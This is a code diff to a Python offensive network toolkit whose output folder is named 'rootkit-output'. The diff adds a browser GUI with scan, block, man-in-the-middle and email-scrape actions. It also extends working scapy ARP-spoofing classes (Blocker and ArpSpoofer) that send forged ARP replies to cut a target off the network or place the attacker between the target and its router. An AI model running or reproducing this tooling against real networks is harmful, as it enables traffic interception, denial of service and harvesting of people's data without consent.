@@ -20,6 +20,59 @@ from itertools import combinations
 import threading
 import random
 import scapy.all as scapy
+import eel
+
+
+def getNetworkIp():
+    ipArr = getRouter(getD=False).split(".")
+    ipArr[3] = "1/24"
+    ip = ""
+    for i in ipArr:
+        ip += i+'.'
+    return ip[:-1]
+
+
+@eel.expose
+def scan():
+    ip = getNetworkIp()
+    print(f"[+] Found network ip {ip}")
+    s = Scanner(ip, Device)
+    print("[+] Scanning...")
+    s.scan()
+    clients = s.clients
+    s = ""
+    data = [["IP", "MAC", "NAME"]]
+    for x in clients:
+        data.append([x.ip, x.mac, getHostName(x.ip)])
+    s = tabulate(data, headers="firstrow", tablefmt="fancy_grid")
+    print(s)
+
+
+@eel.expose()
+def block(target):
+    router = getRouter()
+    print(
+        colored(f"[+] Starting Network Blocker Attack On {target}", "yellow"))
+    blocker = Blocker(router, Device(target))
+    blocker.start()
+
+
+@eel.expose
+def mitm(target):
+    router = getRouter()
+    print(
+        colored(f"[+] Starting Man In The Middle Attack On {target}", "yellow"))
+    spoofer = ArpSpoofer(Device(target), router)
+    spoofer.start()
+
+
+@eel.expose
+def scrape(target):
+    print(colored(f"[+] Starting Email Scraper for {target}", "yellow"))
+    scraper = EmailScraper(
+        target, "/home/ido/rootkit-output/Scraper/emails.txt", 1000, True, False)
+    print(colored("[+] CTRL + C To Stop", "yellow"))
+    scraper.main()
 
 
 class DirSearch():
@@ -246,11 +299,12 @@ class Blocker():
     def __init__(self, router, target) -> None:
         self.target = target
         self.router = router
+        self.stop = False
 
     def spoof(self):
         packet = scapy.ARP(pdst=self.target.ip,
                            hwdst=self.target.mac, psrc=self.router.ip, op=2)
-        while True:
+        while not self.stop:
             scapy.send(packet, verbose=False)
 
     def start(self):
@@ -259,6 +313,7 @@ class Blocker():
         t.start()
         print(f"\n[+] Started for {self.target}\n")
         input("[+] Enter To Stop >> ")
+        self.stop = True
 
 
 class Device():
@@ -275,7 +330,7 @@ class Device():
         try:
             return ans[0][1].hwsrc
         except:
-            raise ValueError("Make sure the device is online!")
+            return ""
 
     def __str__(self) -> str:
         return f"{self.ip} <-> {self.mac}"
@@ -306,6 +361,7 @@ class ArpSpoofer():
     def __init__(self, target, router) -> None:
         self.target = target
         self.router = router
+        self.stop = False
 
     def spoof(self):
         p1 = scapy.ARP(pdst=self.target.ip,
@@ -313,7 +369,7 @@ class ArpSpoofer():
         p2 = scapy.ARP(pdst=self.router.ip,
                        hwdst=self.router.mac, psrc=self.target.ip)
 
-        while True:
+        while not self.stop:
             scapy.send(p1, verbose=False)
             scapy.send(p2, verbose=False)
 
@@ -323,6 +379,7 @@ class ArpSpoofer():
         t.start()
         print(f"[+] Running for {self.target.ip}.")
         input("[+] Enter To Stop >> ")
+        self.stop = True
 
 
 class Logger():
@@ -353,10 +410,13 @@ def isSudo():
     return os.getuid() == 0
 
 
-def getRouter():
+def getRouter(getD=True):
     raw = os.popen("ip route | grep default").read()
     arr = raw.split(" ")
-    x = Device(arr[2])
+    if not getD:
+        x = arr[2]
+    else:
+        x = Device(arr[2])
     return x
 
 
@@ -377,8 +437,12 @@ def getArgs():
                         help="Specify the [MD5 / SHA256] hash you want to crack!")
     parser.add_argument("-l", "--web-logger", dest="logger", action="store_true",
                         help="Specify If You Want To Use Web Logger!")
+    parser.add_argument("-g", "--gui", dest="gui", action="store_true",
+                        help="Specify If You Want To Use The GUI Version!")
     opt = parser.parse_args()
-    if opt.scan and not (opt.scrape or opt.block or opt.mitm or opt.path or opt.crack or opt.logger):
+    if opt.gui:
+        return "gui"
+    elif opt.scan and not (opt.scrape or opt.block or opt.mitm or opt.path or opt.crack or opt.logger):
         return "scan", opt.scan
     elif opt.block and not (opt.scrape or opt.scan or opt.mitm or opt.path or opt.crack or opt.logger):
         return "block", opt.block
@@ -485,4 +549,9 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    if getArgs() == "gui":
+        print(colored("[+] Running GUI Application.", "green", attrs=["bold"]))
+        eel.init('/home/ido/.local/bin/www')
+        eel.start("index.html", size=(1224, 600), position=(300, 200))
+    else:
+        main()
